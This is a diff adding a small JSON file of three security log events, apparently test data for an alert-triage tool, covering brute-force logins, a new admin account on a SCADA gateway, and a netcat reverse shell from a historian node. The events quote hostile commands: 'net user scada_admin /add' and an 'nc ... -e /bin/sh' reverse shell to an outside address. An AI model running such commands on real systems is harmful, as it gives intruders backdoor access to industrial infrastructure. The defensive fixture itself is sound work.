@@ -1,0 +1,31 @@
+[
+  {
+    "event_id": "evt_001",
+    "timestamp": "2025-10-30T03:05:00Z",
+    "source": "ad-controller-01.corp",
+    "event_type": "failed_login",
+    "user": "admin",
+    "source_ip": "203.0.113.200",
+    "count": 15,
+    "time_window_minutes": 5,
+    "details": "Repeated failed logins detected"
+  },
+  {
+    "event_id": "evt_002",
+    "timestamp": "2025-10-30T04:45:00Z",
+    "source": "scada-gateway-01.prod",
+    "event_type": "privilege_escalation",
+    "user": "svc-scada",
+    "process": "net user scada_admin /add",
+    "details": "New administrative account creation on SCADA gateway"
+  },
+  {
+    "event_id": "evt_003",
+    "timestamp": "2025-10-30T06:20:00Z",
+    "source": "ems-historian-01.prod",
+    "event_type": "unusual_process",
+    "process": "/usr/bin/nc",
+    "command_line": "nc 198.51.100.88 4444 -e /bin/sh",
+    "details": "Reverse shell attempt from historian node"
+  }
+]
